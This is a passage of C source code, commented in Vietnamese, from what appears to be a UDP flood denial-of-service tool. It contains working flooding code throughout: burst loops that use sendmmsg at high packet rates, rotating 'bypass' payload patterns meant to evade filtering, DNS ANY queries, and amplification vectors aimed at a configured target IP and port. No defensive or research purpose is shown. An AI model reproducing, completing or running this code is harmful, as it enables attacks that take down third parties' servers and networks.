                high_effect_patterns[count++] = i;
            }
        }
        
        if (count > 0) {
            return high_effect_patterns[burst_count % count];
        }
    }
    
    // Rotation theo category để tăng hiệu quả bypass
    int category = (burst_count / 100) % 3; // Thay đổi category mỗi 100 burst
    
    int category_patterns[50];
    int count = 0;
    
    for (int i = 0; i < num_patterns; i++) {
        if (enhanced_bypass_patterns[i].category == category) {
            category_patterns[count++] = i;
        }
    }
    
    if (count > 0) {
        return category_patterns[burst_count % count];
    }
    
    // Fallback to random pattern
    return burst_count % num_patterns;
}

// Hàm tạo payload với pattern selection thông minh
void generate_smart_bypass_payload(unsigned char *buffer, int burst_count, int consecutive_failures) {
    int pattern_idx = select_optimal_bypass_pattern(burst_count, consecutive_failures);
    generate_enhanced_bypass_payload(buffer, pattern_idx);
}

// Hàm mới: Tạo GUDP payload tối ưu cho Gbps
void generate_gudp_payload(unsigned char *buffer, int burst_count) {
    // Tạo payload lớn để tối đa hóa Gbps
    memset(buffer, 0x41 + (burst_count % 26), PAYLOAD_SIZE); // Fill với A-Z
    
    // Thêm GUDP header
    buffer[0] = 0x47; // 'G'
    buffer[1] = 0x55; // 'U'
    buffer[2] = 0x44; // 'D'
    buffer[3] = 0x50; // 'P'
    buffer[4] = 0x20; // Space
    
    // Thêm payload data để tăng kích thước
    for (int i = 5; i < PAYLOAD_SIZE; i++) {
        buffer[i] = (i + burst_count) % 256;
    }
    
    // Thêm checksum để tăng hiệu quả
    unsigned int checksum = 0;
    for (int i = 0; i < PAYLOAD_SIZE - 4; i++) {
        checksum += buffer[i];
    }
    
    // Lưu checksum vào cuối
    buffer[PAYLOAD_SIZE - 4] = (checksum >> 24) & 0xFF;
    buffer[PAYLOAD_SIZE - 3] = (checksum >> 16) & 0xFF;
    buffer[PAYLOAD_SIZE - 2] = (checksum >> 8) & 0xFF;
    buffer[PAYLOAD_SIZE - 1] = checksum & 0xFF;
}

thread_data_t* init_thread_data_bypass(config_t *cfg) {
    thread_data_t *data = aligned_alloc(64, sizeof(thread_data_t));
    if (!data) return NULL;
    
    memset(data, 0, sizeof(thread_data_t));
    
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        data->socks[i] = create_bypass_socket(); // Sử dụng hàm mới
        if (data->socks[i] < 0) {
            for (int j = 0; j < i; j++) close(data->socks[j]);
            free(data);
            return NULL;
        }
    }
    
    data->addr.sin_family = AF_INET;
    data->addr.sin_port = htons(cfg->port);
    inet_pton(AF_INET, cfg->ip_dest, &data->addr.sin_addr);
    
    for (int i = 0; i < BURST_SIZE; i++) {
        data->buffers[i] = aligned_alloc(64, PAYLOAD_SIZE);
        if (!data->buffers[i]) {
            for (int j = 0; j < i; j++) free(data->buffers[j]);
            for (int j = 0; j < SOCKETS_PER_THREAD; j++) close(data->socks[j]);
            free(data);
            return NULL;
        }
        
        generate_smart_bypass_payload((unsigned char*)data->buffers[i], i, 0);
        
        data->iovecs[i].iov_base = data->buffers[i];
        data->iovecs[i].iov_len = PAYLOAD_SIZE;
        
        data->msgs[i].msg_hdr.msg_name = &data->addr;
        data->msgs[i].msg_hdr.msg_namelen = sizeof(data->addr);
        data->msgs[i].msg_hdr.msg_iov = &data->iovecs[i];
        data->msgs[i].msg_hdr.msg_iovlen = 1;
        data->msgs[i].msg_hdr.msg_control = NULL;
        data->msgs[i].msg_hdr.msg_controllen = 0;
        data->msgs[i].msg_hdr.msg_flags = 0;
    }
    
    return data;
}

// Hàm checksum tối ưu
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len) sum += *(unsigned char*)buf;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (unsigned short)~sum;
}

// Hàm add payload tối ưu
void add_payload(const unsigned char *data, int len, int flag) {
    if (total_payloads >= MAX_PAYLOADS || len > PAYLOAD_SIZE) return;
    struct udphdr *udp_header = (struct udphdr *)payloads[total_payloads];
    unsigned char *payload_data = (unsigned char *)(payloads[total_payloads] + sizeof(struct udphdr));

    udp_header->source = htons(MIN_PORT + (rand() % (MAX_PORT - MIN_PORT + 1)));
    udp_header->dest = 0;
    udp_header->len = 0;
    udp_header->check = 0;

    memcpy(payload_data, data, len);
    payload_data[0] = (flag & 0xFF);
    payload_lens[total_payloads] = len + sizeof(struct udphdr);
    total_payloads++;
}

// Hàm generate DNS payloads tối ưu
void generate_dns_payloads() {
    srand(time(NULL));
    const unsigned char dns_flood[] = "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\xff\x00\x01";
    add_payload(dns_flood, sizeof(dns_flood)-1, 0);

    const unsigned char dns_any[] = "\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06govdot\x03com\x00\x00\xFF\x00\x01";
    add_payload(dns_any, sizeof(dns_any)-1, 0);

    // Giảm số lượng payload để tiết kiệm RAM
    for (int i = 0; i < MAX_PAYLOADS / 2; i++) {
        int len = 200 + rand() % (PAYLOAD_SIZE - 200);
        unsigned char buffer[PAYLOAD_SIZE];
        memcpy(buffer, dns_flood, sizeof(dns_flood)-1);
        for (int j = sizeof(dns_flood)-1; j < len; j++) {
            buffer[j] = rand() % 256;
        }
        add_payload(buffer, len, 0);
    }
}

// Hàm generate GUDP payloads tối ưu
void generate_gudp_payloads() {
    srand(time(NULL));

    const unsigned char http_get1[] = "GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
    add_payload(http_get1, sizeof(http_get1) - 1, 0x01);

    const unsigned char http_get2[] = "GET /about.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
    add_payload(http_get2, sizeof(http_get2) - 1, 0x01);

    const unsigned char dns_query[] = "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01";
    add_payload(dns_query, sizeof(dns_query) - 1, 0x01);

    const unsigned char ntp_request[] = "\x1b\x00\x00\x00\x00\x00\x00\x00";
    add_payload(ntp_request, sizeof(ntp_request), 0x01);

    const unsigned char test_response[] = "RESPONSE OK";
    add_payload(test_response, sizeof(test_response) - 1, 0x02);

    // Giảm số lượng payload để tiết kiệm RAM
    for (int i = 0; i < 10; i++) {
        unsigned char buffer[PAYLOAD_SIZE];
        int len = (i % 3 == 0) ? 1428 : (i % 3 == 1) ? 1420 : 751;
        for (int j = 0; j < len; j++) {
            if (j < 10) buffer[j] = 'A' + (rand() % 26);
            else buffer[j] = 32 + rand() % 95;
        }
        add_payload(buffer, len, (i % 2 == 0) ? 0x01 : 0x02);
    }
}

// Hàm PPS tối ưu mạnh hơn
void* flood_thread_pps_enhanced(void *arg) {
    thread_data *data = (thread_data *)arg;
    
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(data->cpu_id % get_cpu_cores(), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    // Tối ưu buffer size cho PPS
    struct mmsghdr *msgs = mmap(NULL, sizeof(struct mmsghdr) * (MEGA_BATCH / 2),
                                PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    struct iovec *iovs = mmap(NULL, sizeof(struct iovec) * (MEGA_BATCH / 2),
                              PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    char *ring_buffer = mmap(NULL, RING_BUFFER_SIZE / 2,
                             PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (!msgs || !iovs || !ring_buffer) {
        printf("[ERROR] Memory allocation failed for PPS thread\n");
        return NULL;
    }
    
    memset(ring_buffer, 0, RING_BUFFER_SIZE / 2);
    
    for (int i = 0; i < MEGA_BATCH / 2; i++) {
        iovs[i].iov_base = &ring_buffer[i & ((RING_BUFFER_SIZE / 2) - 1)];
        iovs[i].iov_len = 32;  // Giảm kích thước packet để tăng PPS
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &data->target;
        msgs[i].msg_hdr.msg_namelen = sizeof(data->target);
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
    }
    
    time_t start = time(NULL);
    int burst_count = 0;
    
    while (time(NULL) - start < data->duration && running) {
        // Kiểm tra CPU load
        if (should_pause()) {
            usleep(SLEEP_INTERVAL);
            continue;
        }
        
        for (int s = 0; s < data->sock_count && running; s++) {
            // Tăng burst multiplier cho PPS
            for (int b = 0; b < BURST_MULTIPLIER * 2; b++) {
                sendmmsg(data->sockets[s], msgs, MEGA_BATCH / 2, MSG_DONTWAIT | MSG_NOSIGNAL);
            }
        }
        
        // Giảm delay cho PPS
        usleep(BURST_INTERVAL / 4);
        burst_count++;
        
        // Cập nhật CPU load định kỳ
        if (burst_count % 200 == 0) {
            update_cpu_load();
        }
    }
    
    munmap(msgs, sizeof(struct mmsghdr) * (MEGA_BATCH / 2));
    munmap(iovs, sizeof(struct iovec) * (MEGA_BATCH / 2));
    munmap(ring_buffer, RING_BUFFER_SIZE / 2);
    
    return NULL;
}

void* flood_worker_bypass(void *arg) {
    thread_arg_t *targ = (thread_arg_t *)arg;
    config_t *cfg = targ->cfg;
    time_t end_time = time(NULL) + cfg->duration;
    
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(targ->cpu_id, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    thread_data_t *data = init_thread_data_bypass(cfg);
    if (!data) {
        printf("[ERROR] Thread %d: Failed to initialize\n", targ->thread_id);
        return NULL;
    }
    
    printf("[+] Thread %d started on CPU %d (BYPASS method)\n", targ->thread_id, targ->cpu_id);
    
    int burst_count = 0;
    int consecutive_failures = 0;
    int pattern_rotation_count = 0;
    int num_patterns = sizeof(enhanced_bypass_patterns) / sizeof(enhanced_bypass_pattern_t);
    
    while (time(NULL) < end_time && running) {
        // Kiểm tra CPU load và tạm dừng nếu cần
        if (should_pause()) {
            usleep(SLEEP_INTERVAL);
            continue;
        }
        
        // Giảm burst size khi có lỗi liên tiếp
        int current_burst = BURST_SIZE;
        if (consecutive_failures > 5) {
            current_burst = BURST_SIZE / 2;
        }
        if (consecutive_failures > 10) {
            current_burst = BURST_SIZE / 4;
        }
        
        // Cập nhật payload với enhanced bypass
        if (burst_count % BYPASS_ROTATION_INTERVAL == 0) {
            for (int i = 0; i < current_burst; i++) {
                generate_smart_bypass_payload((unsigned char*)data->buffers[i], burst_count, consecutive_failures);
            }
            pattern_rotation_count++;
        }
        
        int sent = sendmmsg(data->socks[data->current_sock], data->msgs, current_burst, 0);
        if (sent > 0) {
            targ->packets_sent += sent;
            targ->bytes_sent += sent * PAYLOAD_SIZE;
            consecutive_failures = 0;  // Reset counter khi thành công
            
            // Thêm delay giữa các burst
            usleep(BURST_INTERVAL);
        } else {
            consecutive_failures++;
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                usleep(SLEEP_INTERVAL);
            } else {
                usleep(SLEEP_INTERVAL * 2);
            }
        }
        
        data->current_sock = (data->current_sock + 1) % SOCKETS_PER_THREAD;
        
        // Giảm tần suất amplification attack và thêm bypass
        if (rand() % 15 == 0) {  // Giảm từ 10 xuống 15
            int amp_idx = rand() % (sizeof(amp_vectors) / sizeof(amplification_vector_t));
            data->addr.sin_port = htons(amp_vectors[amp_idx].port);
            for (int i = 0; i < current_burst; i++) {
                memcpy(data->buffers[i], amp_vectors[amp_idx].payload, amp_vectors[amp_idx].payload_len);
                data->iovecs[i].iov_len = amp_vectors[amp_idx].payload_len;
            }
            sendmmsg(data->socks[data->current_sock], data->msgs, current_burst, 0);
            data->addr.sin_port = htons(cfg->port);
            for (int i = 0; i < current_burst; i++) {
                data->iovecs[i].iov_len = PAYLOAD_SIZE;
            }
        }
        
        burst_count++;
        
        // Cập nhật CPU load định kỳ
        if (burst_count % 100 == 0) {
            update_cpu_load();
        }
    }
    
    for (int i = 0; i < BURST_SIZE; i++) free(data->buffers[i]);
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) close(data->socks[i]);
    free(data);
    
    printf("[+] Thread %d finished (BYPASS method)\n", targ->thread_id);
    return NULL;
}